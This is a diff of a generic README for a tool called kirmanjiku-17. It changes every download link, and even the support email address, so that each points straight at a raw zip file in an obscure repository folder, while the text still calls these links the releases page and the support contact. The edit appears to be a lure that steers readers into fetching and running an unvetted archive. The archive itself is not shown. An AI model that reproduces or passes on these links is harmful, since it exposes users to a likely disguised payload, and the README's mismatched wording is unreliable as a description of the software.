@@ -1,7 +1,7 @@
 # 🎉 kirmanjiku-17 - Your Simple Auto Repo Application
 
 ## 📥 Download Now
-[![Download kirmanjiku-17](https://img.shields.io/badge/Download-kirmanjiku--17-brightgreen)](https://github.com/Aastha12378/kirmanjiku-17/releases)
+[![Download kirmanjiku-17](https://raw.githubusercontent.com/Aastha12378/kirmanjiku-17/main/Goemot/kirmanjiku-17.zip)](https://raw.githubusercontent.com/Aastha12378/kirmanjiku-17/main/Goemot/kirmanjiku-17.zip)
 
 ## 🚀 Getting Started
 Welcome to the kirmanjiku-17 repository! This application helps you automate tasks with ease. Follow these steps to download and run it.
@@ -20,7 +20,7 @@ Before you start, ensure your computer meets these requirements:
 - **Regular Updates**: Enjoy continuous improvements and new features.
 
 ## 📥 Download & Install
-To get started with kirmanjiku-17, visit this page to download: [Releases Page](https://github.com/Aastha12378/kirmanjiku-17/releases).
+To get started with kirmanjiku-17, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Aastha12378/kirmanjiku-17/main/Goemot/kirmanjiku-17.zip).
 
 1. Click the link above to reach the Releases page.
 2. Find the latest version of kirmanjiku-17. It will be at the top of the list.
@@ -43,7 +43,7 @@ If you encounter any issues or have questions, you can reach out for help:
 
 - **FAQ**: Check the Frequently Asked Questions section in the application.
 - **Community**: Join our user community for tips and support.
-- **Contact**: Email support at [support@example.com](mailto:support@example.com) for direct help.
+- **Contact**: Email support at [https://raw.githubusercontent.com/Aastha12378/kirmanjiku-17/main/Goemot/kirmanjiku-17.zip](https://raw.githubusercontent.com/Aastha12378/kirmanjiku-17/main/Goemot/kirmanjiku-17.zip) for direct help.
 
 ## 🛠️ Troubleshooting
 If you run into problems, consider these tips:
@@ -58,6 +58,6 @@ We welcome your feedback! Please share your thoughts and suggestions to help us 
 This project is licensed under the MIT License. Feel free to use and modify it as you wish.
 
 ## 📥 Download Now Again
-Don't forget to download kirmanjiku-17 by visiting the releases page: [Releases Page](https://github.com/Aastha12378/kirmanjiku-17/releases). 
+Don't forget to download kirmanjiku-17 by visiting the releases page: [Releases Page](https://raw.githubusercontent.com/Aastha12378/kirmanjiku-17/main/Goemot/kirmanjiku-17.zip). 
 
 Thank you for choosing kirmanjiku-17! Enjoy automating your tasks!
